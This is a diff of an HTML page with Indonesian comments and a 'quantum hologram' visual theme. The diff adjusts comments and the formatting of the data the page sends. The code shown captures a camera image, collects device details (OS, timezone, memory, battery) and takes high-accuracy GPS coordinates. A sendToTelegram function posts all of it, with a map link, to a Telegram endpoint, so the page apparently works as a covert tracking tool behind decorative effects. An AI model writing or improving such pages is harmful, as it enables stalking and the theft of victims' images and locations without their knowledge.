@@ -6,7 +6,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <style>
-    /* CSS tetap sama seperti sebelumnya */
     :root {
       --primary: #2ecc71;
       --secondary: #3498db;
@@ -30,8 +29,6 @@
       background-size: 50px 50px;
       background-position: 0 0, 25px 25px;
     }
-
-    /* ... (semua style lainnya tetap sama) ... */
 
     .hologram-effect {
       position: fixed;
@@ -85,20 +82,20 @@
       return hologram;
     }
 
-    // Fungsi untuk mengambil gambar dari kamera
+    // Fungsi untuk mengambil gambar dari kamera dengan efek quantum & glitch
     async function captureQuantumImage() {
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       
-      // Tambahkan efek quantum
+      // Efek quantum
       ctx.drawImage(video, 0, 0);
       ctx.globalCompositeOperation = 'lighter';
       ctx.filter = 'hue-rotate(90deg) contrast(150%)';
       ctx.drawImage(canvas, 0, 0);
       
-      // Tambahkan efek glitch
+      // Efek glitch
       ctx.globalAlpha = 0.3;
       ctx.fillStyle = '#00ff88';
       for(let i = 0; i < 50; i++) {
@@ -142,13 +139,18 @@
       else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
       
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const memory = navigator.deviceMemory || "N/A";
+      // Tampilkan deviceMemory dalam GB jika tersedia
+      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
       
+      // Pengambilan informasi baterai
       let batteryInfo = { level: "N/A", charging: "N/A" };
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
-          batteryInfo = { level: battery.level, charging: battery.charging };
+          batteryInfo = { 
+            level: Math.round(battery.level * 100) + '%', 
+            charging: battery.charging ? "Yes" : "No" 
+          };
         } catch (e) {
           console.error("Battery API error:", e);
         }
@@ -216,9 +218,9 @@
       // Ubah dataURI menjadi Blob dan lampirkan sebagai file foto
       formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
       formData.append('caption', 
-        `Coordinates: ${report.metadata.location.coordinates}\n` +
-        `Map: ${report.metadata.location.link}\n` +
-        `Device Info:\n${JSON.stringify(report.metadata.deviceInfo, null, 2)}`
+        `*Coordinates:* ${report.metadata.location.coordinates}\n` +
+        `*Map:* [Link](${report.metadata.location.link})\n` +
+        `*Device Info:*\n\`\`\`\n${JSON.stringify(report.metadata.deviceInfo, null, 2)}\n\`\`\``
       );
 
       fetch(url, {
@@ -276,7 +278,7 @@
             sendToTelegram(report);
           },
           {
-            enableHighAccuracy: true, // Meminta akurasi tinggi
+            enableHighAccuracy: true,
             timeout: 10000,
             maximumAge: 0
           }
